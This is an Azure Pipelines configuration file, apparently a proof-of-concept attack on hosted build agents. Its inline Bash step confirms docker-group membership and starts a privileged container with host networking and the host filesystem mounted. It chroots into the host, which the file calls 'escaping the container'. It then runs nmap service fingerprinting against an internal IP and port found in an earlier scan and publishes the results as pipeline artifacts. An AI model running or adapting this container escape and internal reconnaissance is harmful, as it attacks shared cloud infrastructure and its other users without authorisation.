# azure-pipelines.yml
trigger:
- main
pr:
- main

name: $(Date:yyyyMMdd)$(Rev:.r)

stages:
- stage: FinalPoc
  displayName: 'Final PoC: Advanced Service Fingerprinting'
  jobs:
  - job: Linux_Advanced_Service_Interrogation
    displayName: 'PoC: Fingerprint Discovered Internal Service'
    pool:
      vmImage: 'ubuntu-22.04'
    steps:
    - checkout: none
    - task: Bash@3
      displayName: 'Escape Container and Fingerprint Target Service'
      inputs:
        targetType: inline
        script: |
          set -euo pipefail
          mkdir -p artifacts

          echo "--- Verifying container escape vector ---"
          if ! (id | grep -q '(docker)'); then
            echo "❌ CRITICAL FAILURE: User is not in the docker group. Aborting."
            id
            exit 1
          fi
          echo "✅ Confirmed user is in 'docker' group."

          # Target IP and Port discovered from the previous scan
          TARGET_IP="10.1.0.156"
          TARGET_PORT="8084"

          echo "--- Installing tools (Nmap) ---"
          sudo apt-get update >/dev/null && sudo apt-get install -y nmap >/dev/null
          
          echo "--- ESCAPING CONTAINER to fingerprint ${TARGET_IP}:${TARGET_PORT} from the host ---"
          
          docker run --rm --privileged --network=host -v /:/hostfs \
            -v /usr/bin/nmap:/usr/bin/nmap -v /usr/share/nmap:/usr/share/nmap \
            -v $(pwd)/artifacts:/artifacts \
            alpine:latest sh -c "
              echo '--- [HOST] Attempting to fingerprint the service with Nmap Version Detection (-sV) ---'
              
              # -sV: Probe open ports to determine service/version info
              # -Pn: Skip host discovery (we know it's up)
              # --version-intensity 5: A reasonable level for deeper probes without being too slow
              chroot /hostfs /usr/bin/nmap -Pn -sV --version-intensity 5 -p ${TARGET_PORT} ${TARGET_IP} -oN /artifacts/service-fingerprint.txt
            "
          
          echo "✅ FINGERPRINTING COMPLETE."
          echo "--- Nmap Service/Version Scan Results ---"
          cat artifacts/service-fingerprint.txt

          if grep -q "State: open" artifacts/service-fingerprint.txt; then
            echo "✅ VULNERABILITY CONFIRMED: Successfully connected to the open port and gathered service information."
          else
            echo "⚠️ Test inconclusive. Could not gather service information."
          fi
    - task: PublishPipelineArtifact@1
      displayName: 'Publish Service Fingerprint Artifacts'
      condition: succeededOrFailed()
      inputs:
        targetPath: 'artifacts'
        artifact: 'azure-final-poc-results'
